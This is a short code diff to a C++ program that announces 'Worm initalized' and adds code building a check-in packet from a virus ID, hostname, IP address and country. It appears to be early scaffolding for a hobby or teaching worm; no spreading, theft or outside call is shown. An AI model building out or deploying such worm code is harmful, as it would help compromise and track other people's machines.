@@ -1,5 +1,4 @@
 
-
 #include <stdio.h>  
 #include <iostream>
 #include <tchar.h>
@@ -12,6 +11,16 @@ using namespace std;
 int main()
 {
     cout << "Worm initalized ... \n\n";
+	char insert_key = 'A'; 
+	const char* virus_id = "firstviru"; 
+	const char* hostname = "dakota"; 
+	const char* ip = "10.2.0.14"; 
+	const char* country = "US";
+
+
+	char* packet = structure_init_message(insert_key, virus_id, hostname, ip, country);
+	cout << "the packet is" << packet << endl; 
+
 
 	// Test the functions here
 
